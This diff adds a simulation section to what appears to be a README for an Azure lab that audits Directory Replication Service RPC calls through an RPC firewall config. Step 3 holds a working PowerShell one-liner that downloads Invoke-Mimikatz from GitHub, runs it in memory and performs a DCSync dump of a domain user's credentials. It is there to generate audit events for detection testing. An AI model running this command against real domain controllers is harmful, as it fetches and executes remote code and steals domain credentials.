@@ -34,3 +34,28 @@
 * Remote Access Restrictions (`AllowPublicIP` default option)
     * Access via Azure Bastion (Recommended. Additional costs applied)
     * Restrict Access to one Public IP Address (For example, Home Public IP Address)
+
+## Validate Deployment
+
+## Simulations
+
+### Monitoring Directory Replication Service (DRS) Remote Protocol
+
+1. Validate that the domain controller contains the `RpcFw.conf` file in the `C:\ProgramData` folder.
+2. Validate that the following entry exists in the config file:
+
+```
+uuid:e3514235-4b06-11d1-ab04-00c04fc2dcd2 action:allow audit:true
+```
+
+3. Open PowerShell and run the following commands:
+
+```PowerShell
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -Command '"lsadump::dcsync /domain:azsentinel.local /user:azsentinel\pgustavo" "exit"
+```
+
+4. Check Event Viewer > Applications and Services Logs > RPCFW
+
+## References:
+* https://github.com/Cyb3rWard0g/WinRpcFunctions
+* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0
